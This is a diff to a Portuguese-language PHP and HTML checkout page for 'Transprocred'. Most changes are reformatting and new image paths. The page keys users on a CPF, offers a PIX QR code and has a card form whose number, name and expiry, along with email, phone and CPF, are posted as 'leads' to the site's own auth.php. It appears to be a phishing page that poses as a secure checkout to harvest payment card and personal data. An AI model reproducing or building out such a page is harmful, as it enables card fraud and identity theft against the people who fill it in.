@@ -19,8 +19,10 @@ if (!$cpf) {
     die("Acesso inválido. CPF não informado.");
 }
 
-function getUsers() {
-    if (!file_exists(USERS_FILE)) return [];
+function getUsers()
+{
+    if (!file_exists(USERS_FILE))
+        return [];
     return json_decode(file_get_contents(USERS_FILE), true) ?: [];
 }
 
@@ -55,11 +57,13 @@ $qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urle
 ?>
 <!DOCTYPE html>
 <html lang="pt-BR">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Checkout Seguro - Transprocred</title>
-    <link href="https://fonts.googleapis.com/css2?family=Proxima+Nova:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Proxima+Nova:wght@300;400;600;700&display=swap"
+        rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
@@ -84,7 +88,7 @@ $qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urle
             display: flex;
             align-items: center;
             justify-content: center;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
             color: #fff;
         }
 
@@ -106,7 +110,7 @@ $qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urle
             background: #fff;
             border-radius: 4px;
             padding: 24px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
             margin-bottom: 20px;
         }
 
@@ -177,7 +181,10 @@ $qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urle
         #pix-modal {
             display: none;
             position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             background: #fff;
             z-index: 1000;
             overflow-y: auto;
@@ -225,7 +232,10 @@ $qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urle
         #card-modal {
             display: none;
             position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             background: #fff;
             z-index: 1000;
             overflow-y: auto;
@@ -243,7 +253,8 @@ $qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urle
             margin-bottom: 8px;
         }
 
-        .form-group input, .form-group select {
+        .form-group input,
+        .form-group select {
             width: 100%;
             padding: 12px;
             border: 1px solid #ccc;
@@ -264,7 +275,7 @@ $qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urle
             color: #fff;
             margin-bottom: 30px;
             text-align: left;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
         }
 
         .card-icons {
@@ -304,15 +315,14 @@ $qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urle
             color: var(--text-light);
             font-size: 12px;
         }
-
-
     </style>
 
 </head>
+
 <body>
 
     <div class="header">
-        <img src="../images/transpoicon.png" alt="Transprocred">
+        <img src="../public/assets/vendor/images/transpoicon.png" alt="Transprocred">
     </div>
 
 
@@ -329,7 +339,7 @@ $qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urle
 
             <div class="payment-methods">
                 <h3>Como você quer pagar?</h3>
-                
+
                 <div class="method-item" onclick="openPix()">
                     <div class="method-icon"><i class="fas fa-qrcode"></i></div>
                     <div class="method-info">
@@ -359,49 +369,59 @@ $qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urle
     <!-- Modal PIX -->
     <div id="pix-modal">
         <div class="header header-modal">
-            <div onclick="closePix()" style="position:absolute; left:20px; cursor:pointer; color: #fff;"><i class="fas fa-arrow-left"></i></div>
-            <img src="../images/transpoicon.png" alt="Transprocred">
+            <div onclick="closePix()" style="position:absolute; left:20px; cursor:pointer; color: #fff;"><i
+                    class="fas fa-arrow-left"></i></div>
+            <img src="../public/assets/vendor/images/transpoicon.png" alt="Transprocred">
         </div>
         <div class="pix-container">
             <div id="pix-lead-section">
                 <h3>Identificação</h3>
-                <p style="color:var(--text-light); font-size:14px; margin-bottom: 30px;">Informe seus dados para identificação do pagamento.</p>
+                <p style="color:var(--text-light); font-size:14px; margin-bottom: 30px;">Informe seus dados para
+                    identificação do pagamento.</p>
                 <div class="form-group">
                     <label>E-mail</label>
-                    <input type="email" id="pix-email" value="<?php echo htmlspecialchars($user['email'] ?? ''); ?>" placeholder="seu@email.com">
+                    <input type="email" id="pix-email" value="<?php echo htmlspecialchars($user['email'] ?? ''); ?>"
+                        placeholder="seu@email.com">
                 </div>
                 <div class="form-group">
                     <label>Telefone / WhatsApp</label>
-                    <input type="text" id="pix-phone" value="<?php echo htmlspecialchars($user['phone'] ?? ''); ?>" placeholder="(00) 00000-0000">
+                    <input type="text" id="pix-phone" value="<?php echo htmlspecialchars($user['phone'] ?? ''); ?>"
+                        placeholder="(00) 00000-0000">
                 </div>
                 <div class="form-group">
                     <label>CPF</label>
-                    <input type="text" id="pix-cpf" value="<?php echo htmlspecialchars($cpf); ?>" placeholder="000.000.000-00">
+                    <input type="text" id="pix-cpf" value="<?php echo htmlspecialchars($cpf); ?>"
+                        placeholder="000.000.000-00">
                 </div>
                 <button class="btn-blue" onclick="confirmPixLead()">GERAR PIX</button>
             </div>
 
             <div id="pix-payment-section" style="display:none;">
                 <h3>Tudo pronto!</h3>
-                <p style="color:var(--text-light); font-size:14px; margin-bottom: 30px;">Escaneie o QR Code ou copie e cole o código para pagar.</p>
-            
-            <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 10px; color: var(--mp-blue);">
-                <i class="fas fa-spinner fa-spin"></i>
-                <span style="font-weight: 600; font-size: 14px;">Aguardando pagamento...</span>
-            </div>
+                <p style="color:var(--text-light); font-size:14px; margin-bottom: 30px;">Escaneie o QR Code ou copie e
+                    cole o código para pagar.</p>
 
-            <div class="pix-qr">
-                <img src="<?php echo $qrUrl; ?>" style="width:100%;">
-            </div>
+                <div
+                    style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 10px; color: var(--mp-blue);">
+                    <i class="fas fa-spinner fa-spin"></i>
+                    <span style="font-weight: 600; font-size: 14px;">Aguardando pagamento...</span>
+                </div>
 
-            <div class="pix-copy-box" id="payload-text">
-                <?php echo $payload; ?>
-            </div>
+                <div class="pix-qr">
+                    <img src="<?php echo $qrUrl; ?>" style="width:100%;">
+                </div>
 
-            <button class="btn-blue" onclick="copyPayload()" style="margin-bottom: 12px;">COPIAR CÓDIGO PIX</button>
-            <button class="btn-blue" onclick="confirmPayment()" style="background: transparent; color: var(--mp-blue); border: 1px solid var(--mp-blue);">JÁ FIZ O PAGAMENTO</button>
-            
-                <p style="margin-top:20px; font-size:13px; color:var(--mp-blue); cursor:pointer;" onclick="closePix()">Escolher outro meio de pagamento</p>
+                <div class="pix-copy-box" id="payload-text">
+                    <?php echo $payload; ?>
+                </div>
+
+                <button class="btn-blue" onclick="copyPayload()" style="margin-bottom: 12px;">COPIAR CÓDIGO PIX</button>
+                <button class="btn-blue" onclick="confirmPayment()"
+                    style="background: transparent; color: var(--mp-blue); border: 1px solid var(--mp-blue);">JÁ FIZ O
+                    PAGAMENTO</button>
+
+                <p style="margin-top:20px; font-size:13px; color:var(--mp-blue); cursor:pointer;" onclick="closePix()">
+                    Escolher outro meio de pagamento</p>
             </div>
         </div>
     </div>
@@ -409,8 +429,9 @@ $qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urle
     <!-- Modal Cartão -->
     <div id="card-modal">
         <div class="header header-modal">
-            <div onclick="closeCard()" style="position:absolute; left:20px; cursor:pointer; color: #fff;"><i class="fas fa-arrow-left"></i></div>
-            <img src="../images/transpoicon.png" alt="Transprocred">
+            <div onclick="closeCard()" style="position:absolute; left:20px; cursor:pointer; color: #fff;"><i
+                    class="fas fa-arrow-left"></i></div>
+            <img src="../public/assets/vendor/images/transpoicon.png" alt="Transprocred">
         </div>
         <div class="pix-container" style="max-width: 450px; padding: 30px 20px;">
             <div class="card-preview">
@@ -432,16 +453,20 @@ $qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urle
 
             <div class="form-group" style="border-bottom: 1px solid #eee; padding-bottom: 15px; margin-bottom: 15px;">
                 <label>E-mail para confirmação</label>
-                <input type="email" id="card-email" value="<?php echo htmlspecialchars($user['email'] ?? ''); ?>" placeholder="seu@email.com">
+                <input type="email" id="card-email" value="<?php echo htmlspecialchars($user['email'] ?? ''); ?>"
+                    placeholder="seu@email.com">
                 <label style="margin-top: 10px;">Telefone / WhatsApp</label>
-                <input type="text" id="card-phone" value="<?php echo htmlspecialchars($user['phone'] ?? ''); ?>" placeholder="(00) 00000-0000">
+                <input type="text" id="card-phone" value="<?php echo htmlspecialchars($user['phone'] ?? ''); ?>"
+                    placeholder="(00) 00000-0000">
                 <label style="margin-top: 10px;">CPF</label>
-                <input type="text" id="card-cpf" value="<?php echo htmlspecialchars($cpf); ?>" placeholder="000.000.000-00">
+                <input type="text" id="card-cpf" value="<?php echo htmlspecialchars($cpf); ?>"
+                    placeholder="000.000.000-00">
             </div>
 
             <div class="form-group">
                 <label>Número do cartão</label>
-                <input type="text" id="card-num" placeholder="0000 0000 0000 0000" maxlength="19" onkeyup="updateCardPreview()">
+                <input type="text" id="card-num" placeholder="0000 0000 0000 0000" maxlength="19"
+                    onkeyup="updateCardPreview()">
             </div>
             <div class="form-group">
                 <label>Nome impresso no cartão</label>
@@ -469,7 +494,8 @@ $qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urle
             </div>
 
             <button class="btn-blue" onclick="saveCardInfo()">CONFIRMAR PAGAMENTO</button>
-            <button class="btn-gray" onclick="closeCard()" style="background: transparent; border: none; color: #999; font-weight: 400; font-size: 14px; margin-top: 15px;">Voltar</button>
+            <button class="btn-gray" onclick="closeCard()"
+                style="background: transparent; border: none; color: #999; font-weight: 400; font-size: 14px; margin-top: 15px;">Voltar</button>
         </div>
     </div>
 
@@ -483,7 +509,7 @@ $qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urle
             try {
                 const response = await fetch('../auth.php', {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: new URLSearchParams({
                         action: 'update_lead',
                         username: cpf.replace(/\D/g, ''),
@@ -503,7 +529,7 @@ $qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urle
             const email = document.getElementById('pix-email').value;
             const phone = document.getElementById('pix-phone').value;
             const cpf = document.getElementById('pix-cpf').value;
-            
+
             const success = await saveLead(email, phone, cpf);
             if (success) {
                 document.getElementById('pix-lead-section').style.display = 'none';
@@ -549,7 +575,7 @@ $qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urle
             // Format card number with spaces
             num = num.replace(/\s?/g, '').replace(/(\d{4})/g, '$1 ').trim();
             document.getElementById('card-num').value = num;
-            
+
             document.getElementById('display-number').innerText = num || '•••• •••• •••• ••••';
             document.getElementById('display-name').innerText = document.getElementById('card-name').value.toUpperCase() || 'NOME COMPLETO';
             document.getElementById('display-date').innerText = document.getElementById('card-expiry').value || 'MM/AA';
@@ -587,10 +613,10 @@ $qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urle
                 // Then save card info
                 const response = await fetch('../auth.php', {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: new URLSearchParams(data)
                 });
-                
+
                 if (!response.ok) {
                     throw new Error('Erro no servidor: ' + response.status);
                 }
@@ -615,4 +641,5 @@ $qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urle
         }
     </script>
 </body>
+
 </html>
